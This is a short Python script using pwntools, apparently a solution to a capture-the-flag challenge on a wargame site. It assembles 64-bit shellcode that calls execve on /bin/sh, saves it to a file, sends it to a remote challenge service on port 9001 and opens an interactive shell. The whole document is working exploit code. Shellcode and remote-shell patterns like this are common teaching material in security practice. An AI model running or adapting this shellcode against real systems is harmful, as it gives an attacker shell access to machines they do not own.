from pwn import *

context.arch = 'amd64'  # Ensure 64-bit architecture

shellcode = """
jmp code

shell:
    .ascii "/bin/sh\\x00"     # Embed '/bin/sh' as a null-terminated string

code:
    xor rsi, rsi              # Clear RSI for null argv
    xor rdx, rdx              # Clear RDX for null envp
    lea rdi, [rip+shell]      # Corrected: Load the address of 'shell' using RIP-relative addressing
    mov al, 0x3b              # syscall execve (0x3b)
    syscall                   # Trigger the syscall
"""

# Create the binary payload
payload = asm(shellcode)

# Save the payload for debugging
with open("payload", "wb") as f:
    f.write(payload)

# Spawn the process and send the payload
#p = process("./shellcope")
p = remote("pwnable.co.il", 9001)
p.sendline(payload)
p.interactive()
